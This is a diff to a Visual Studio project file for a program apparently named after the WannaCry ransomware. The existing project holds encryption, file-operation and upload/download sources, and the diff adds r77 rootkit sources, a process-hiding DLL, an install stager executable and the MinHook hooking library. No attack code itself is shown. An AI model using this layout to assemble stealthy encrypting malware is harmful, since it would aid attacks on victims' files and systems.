@@ -79,6 +79,7 @@
     <LinkIncremental>false</LinkIncremental>
     <IncludePath>$(IncludePath)</IncludePath>
     <LibraryPath>$(LibraryPath)</LibraryPath>
+    <TargetName>WaotoCry</TargetName>
   </PropertyGroup>
   <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
     <LinkIncremental>true</LinkIncremental>
@@ -157,13 +158,20 @@
     <ClCompile Include="Encryption.cpp" />
     <ClCompile Include="file_operation.cpp" />
     <ClCompile Include="Funtions.cpp" />
+    <ClCompile Include="hand file\r77\r77 hand\Install.cpp" />
+    <ClCompile Include="hand file\r77\r77 hand\r77api.cpp" />
+    <ClCompile Include="kernel.cpp" />
     <ClCompile Include="uoload_or_download-function.cpp" />
   </ItemGroup>
   <ItemGroup>
     <ClInclude Include="API.h" />
+    <ClInclude Include="hand file\r77\r77 hand\Install.h" />
+    <ClInclude Include="hand file\r77\r77 hand\ntdll.h" />
+    <ClInclude Include="hand file\r77\r77 hand\r77api.h" />
     <ClInclude Include="resource.h" />
     <ClInclude Include="resource\Encryption\aes_pre.h" />
     <ClInclude Include="resource\Encryption\aes_transfer.h" />
+    <ClInclude Include="resource\内核\MinHook.h" />
     <ClInclude Include="Un-main.h" />
   </ItemGroup>
   <ItemGroup>
@@ -171,6 +179,11 @@
   </ItemGroup>
   <ItemGroup>
     <None Include="file\libuv.dll" />
+    <None Include="file\ProcessHide.dll" />
+    <None Include="hand file\r77\exe file\InstallStager.exe" />
+  </ItemGroup>
+  <ItemGroup>
+    <Library Include="resource\内核\libMinHook.x64.lib" />
   </ItemGroup>
   <Import Project="$(VCTargetsPath)\Microsoft.Cpp.targets" />
   <ImportGroup Label="ExtensionTargets">
